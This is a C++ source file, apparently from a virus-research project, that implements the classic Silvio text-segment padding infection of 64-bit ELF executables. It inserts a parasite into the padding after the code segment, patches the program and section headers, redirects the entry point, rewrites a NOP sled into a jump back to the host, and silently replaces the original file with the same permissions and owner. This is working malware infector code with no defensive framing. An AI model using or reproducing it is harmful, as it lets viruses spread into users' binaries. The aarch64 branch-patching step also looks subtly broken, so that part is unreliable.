#include "infector/silvio.hh"
#include <linux/elf.h>
#include "common/file_descriptor.hh"
#include "common/patch_pattern.hh"
#include "common/string.hh"
#include "std/string.hh"
/********************  ALGORITHM   *********************


--- Load parasite from file into memory
1.	Get parasite_size and parasite_code addresss (location in allocated
memory)


--- Find padding_size between CODE segment and the NEXT segment after CODE
segment 2.	CODE segment : increase
                -> p_filesz 		(by parasite size)
                -> p_memsz 			(by parasite size)
        Get and Set respectively,
        padding_size 	= (offset of next segment (after CODE segment)) - (end
of CODE segment) parasite_offset = (end of CODE segment) or (end of last section
of CODE segment)


---	PATCH Host entry point
3.	Save original_entry_point (e_entry) and replace it with parasite_offset


--- PATCH SHT
4.  Find the last section in CODE Segment and increase -
        -> sh_size          (by parasite size)


--- PATCH Parasite offset
5.	Find and replace Parasite jmp exit addresss with original_entry_point


---	Inject Parasite to Host @ host_mapping
6.	Inject parasite code to (host_mapping + parasite_offset)


7.	Write infection to disk x_x

*/
namespace vt::infector {
namespace {
struct SilvioElfInfo {
  uint64_t padding_size;
  Elf64_Off code_segment_end_offset;
  Elf64_Off parasite_offset;
  Elf64_Addr parasite_load_address;
  size_t patch_entry_idx;
};

// Patch SHT (i.e. find the last section of CODE segment and increase its size
// by parasite_size)
bool patch_sht(vt::common::Mmap<PROT_READ | PROT_WRITE>& output_mapping,
               size_t parasite_size, Elf64_Off code_segment_end_offset) {
  auto base = output_mapping.mutable_base();
  auto elf_header = reinterpret_cast<const Elf64_Ehdr*>(base);

  auto sht_offset = elf_header->e_shoff;
  auto sht_entry_count = elf_header->e_shnum;

  // Point shdr (Pointer to iterate over SHT) to the last entry of SHT
  auto section_entry = reinterpret_cast<Elf64_Shdr*>(base + sht_offset);

  for (size_t i = 0; i < sht_entry_count; ++i) {
    auto current_section_end_offset =
        section_entry->sh_offset + section_entry->sh_size;
    if (code_segment_end_offset == current_section_end_offset) {
      // This is the last section of CODE Segment
      // Increase the sizeof this section by a parasite_size to accomodate
      // parasite
      section_entry->sh_size += parasite_size;
      return true;
    }
    // Move to the next section entry
    ++section_entry;
  }
  return false;
}

void patch_phdr(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
                uint64_t parasite_size, size_t patch_entry_idx) {
  auto elf_header = (Elf64_Ehdr*)host_mapping.mutable_base();
  Elf64_Off pht_offset = elf_header->e_phoff;

  // Point to first entry in PHT
  auto phdr_entry = (Elf64_Phdr*)(host_mapping.mutable_base() + pht_offset);
  phdr_entry += patch_entry_idx;
  phdr_entry->p_filesz += parasite_size;
  phdr_entry->p_memsz += parasite_size;
}

Elf64_Addr patch_ehdr(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
                      const SilvioElfInfo& info) {
  Elf64_Ehdr* header =
      reinterpret_cast<Elf64_Ehdr*>(host_mapping.mutable_base());
  Elf64_Addr original_entry_point = header->e_entry;
  if (header->e_type == ET_EXEC) {
    header->e_entry = info.parasite_load_address;
  } else if (header->e_type == ET_DYN) {
    header->e_entry = info.parasite_offset;
  } else {
    CHECK_FAIL();
  }
  return original_entry_point;
}

bool patch_parasite_and_resume_control(
    Elf64_Addr original_entry_point, size_t parasite_size,
    vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
    SilvioElfInfo& info) {
#if defined(__x86_64__)
  // For x86-64, patch the jmp address to the original entry point.
  // It is assumed that the inserted virus has at least 8 bytes of noop and
  // that's where it jumps back to host.
  // jmp rel32 e9 xxxxxxxx The rel32 offset is from the next instruction after
  // the jmp. The patched jump instruction is always 5 bytes.
  auto cur = common::find<uint64_t>(host_mapping.base() + info.parasite_offset,
                                    parasite_size, 0x9090909090909090);
  if (cur == -1) {
    printf("failed to patch host entry\n");
    return false;
  }
  auto header = reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
  int32_t rel = 0;
  if (header->e_type == ET_EXEC) {
    // for executables, the original entry is the load address, the parasite
    // load address is the new memory address. Use that for offset calculation.
    rel = original_entry_point - (info.parasite_load_address + cur + 5);
  } else if (header->e_type == ET_DYN) {
    // Both original and parasite offset are relative address to the process
    // start, which is not known until runtime.
    rel = original_entry_point - (info.parasite_offset + cur + 5);
  } else {
    CHECK_FAIL();
  }
  *(host_mapping.mutable_base() + info.parasite_offset + cur) = 0xe9;
  *(int32_t*)(host_mapping.mutable_base() + info.parasite_offset + cur + 1) =
      rel;
#elif defined(__aarch64__)
  // For aarch64, patch the b address to the orignal entry point.
  // It is assumed that the inserted virus has at least 4 bytes of noop and
  // that's where it jumps back to host.

  // b imm26
  // 000101 imm26
  // imm26 = rel / 4
  // The rel is offset from the current instruction (b xxx)
  // The patched jump instruction is always 4 bytes.

  auto cur = common::find<uint32_t>(host_mapping.base() + info.parasite_offset,
                                   parasite_size, 0xd503201f);
  if (cur == -1) {
    printf("failed to patch host entry\n");
    return false;
  }
  int32_t rel = original_entry_point - (info.parasite_offset + cur);
  printf("original 0x%x\n", original_entry_point);
  printf("cur jmp 0x%x\n", info.parasite_offset + cur);
  printf("diff 0x%d\n", rel);

  rel /= 4;
  *(int32_t*)(host_mapping.mutable_base() + info.parasite_offset + cur) = rel;
  *(host_mapping.mutable_base() + info.parasite_offset + cur) &= 0b101;
#endif
  return true;
}

// Returns gap size (accomodation for parasite code in padding between CODE
// segment and next segment after CODE segment) padding size,
// code_segment_end_offset, parasite_offset, parasite_load_address
bool get_info(const char* host_mapping, uint64_t parasite_size,
              SilvioElfInfo& info) {
  auto elf_header = (const Elf64_Ehdr*)host_mapping;
  uint16_t pht_entry_count = elf_header->e_phnum;
  Elf64_Off pht_offset = elf_header->e_phoff;
  Elf64_Off code_segment_end_offset = 0;
  Elf64_Off parasite_offset = 0;
  Elf64_Addr parasite_load_address;

  // Point to first entry in PHT
  auto phdr_entry = (const Elf64_Phdr*)(host_mapping + pht_offset);

  // Parse PHT entries
  bool CODE_SEGMENT_FOUND = 0;

  for (size_t i = 0; i < pht_entry_count; ++i) {
    // Find the CODE Segment (containing .text section)
    if (!CODE_SEGMENT_FOUND && phdr_entry->p_type == PT_LOAD &&
        phdr_entry->p_flags == (PF_R | PF_X)) {
      CODE_SEGMENT_FOUND = true;

      // Calculate the offset where the code segment ends to bellow calculate
      // padding_size
      code_segment_end_offset = phdr_entry->p_offset + phdr_entry->p_filesz;
      parasite_offset = code_segment_end_offset;
      parasite_load_address = phdr_entry->p_vaddr + phdr_entry->p_filesz;
    }

    // Find next segment after CODE Segment and calculate padding size
    if (CODE_SEGMENT_FOUND == true && phdr_entry->p_type == PT_LOAD &&
        phdr_entry->p_flags == (PF_R | PF_W)) {
      // Return padding_size (maximum size of parasite that host can accomodate
      // in its padding between the end of CODE segment and start of next
      // loadable segment)
      info =
          SilvioElfInfo{.padding_size = phdr_entry->p_offset - parasite_offset,
                        .code_segment_end_offset = code_segment_end_offset,
                        .parasite_offset = parasite_offset,
                        .parasite_load_address = parasite_load_address,
                        .patch_entry_idx = i - 1};
      return true;
    }

    ++phdr_entry;
  }

  return false;
}

}  // namespace

bool silvio_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                     vt::common::Mmap<PROT_READ> parasite_mapping) {
  const Elf64_Ehdr* host_header =
      reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
  if (host_header->e_type == ET_REL || host_header->e_type == ET_CORE) {
    return false;
  }
  if (host_header->e_ident[EI_CLASS] == ELFCLASS32) {
    return false;
  }

  SilvioElfInfo info{};
  // Get Home size (in bytes) of parasite residence in host
  // and check if host's home size can accomodate a parasite this big in size
  if (!get_info(host_mapping.base(), parasite_mapping.size(), info)) {
    printf("Cannot correctly parse host elf\n");
    return false;
  }

  if (info.padding_size < parasite_mapping.size()) {
    printf(
        "Host cannot accomodate parasite padding size: %d parasite size: %d\n",
        info.padding_size, parasite_mapping.size());
    return false;
  }

  // Patch program header table and increase text section size.
  patch_phdr(host_mapping, parasite_mapping.size(), info.patch_entry_idx);

  // Patch section header table to increase text section size
  if (!patch_sht(host_mapping, parasite_mapping.size(),
                 info.code_segment_end_offset)) {
    printf("Failed to patch section header table\n");
    return false;
  }

  // Patch elf header entry point to run the parasite.
  auto original_entry_point = patch_ehdr(host_mapping, info);

  // Inject parasite in Host
  memcpy(host_mapping.mutable_base() + info.parasite_offset,
         parasite_mapping.base(), parasite_mapping.size());

  return patch_parasite_and_resume_control(
      original_entry_point, parasite_mapping.size(), host_mapping, info);
}

bool silvio_infect64(const char* host_path, const char* parasite_path) {
  vt::common::FileDescriptor host(host_path, O_RDONLY);
  if (!host.valid()) {
    return false;
  }

  vt::common::FileDescriptor parasite(parasite_path, O_RDONLY);

  if (!parasite.valid()) {
    return false;
  }
  common::String tmp(host_path);

  const char postfix = '.';
  tmp += postfix;
  vt::common::FileDescriptor output(tmp.c_str(), O_RDWR | O_CREAT, S_IRWXU);

  if (!output.valid()) {
    return false;
  }
  auto host_size = host.file_size();
  ftruncate(output.handle(), host_size);

  vt::common::Mmap<PROT_READ> host_mapping(host_size, MAP_SHARED, host.handle(),
                                           0);

  vt::common::Mmap<PROT_READ | PROT_WRITE> output_host_mapping(
      host_mapping.size(), MAP_SHARED, output.handle(), 0);

  memcpy(output_host_mapping.mutable_base(), host_mapping.base(),
         host_mapping.size());

  vt::common::Mmap<PROT_READ> parasite_mapping(parasite.file_size(), MAP_SHARED,
                                               parasite.handle(), 0);
  if (!silvio_infect64(vt::move(output_host_mapping),
                       vt::move(parasite_mapping))) {
    return false;
  }
  struct stat s;
  if (fstat(host.handle(), &s) < 0) {
    return false;
  }
  if (fchmod(output.handle(), s.st_mode) < 0) {
    return false;
  }
  if (fchown(output.handle(), s.st_uid, s.st_gid) < 0) {
    return false;
  }
  if (rename(tmp.c_str(), host_path) < 0) {
    return false;
  }
  return true;
}

}  // namespace vt::infector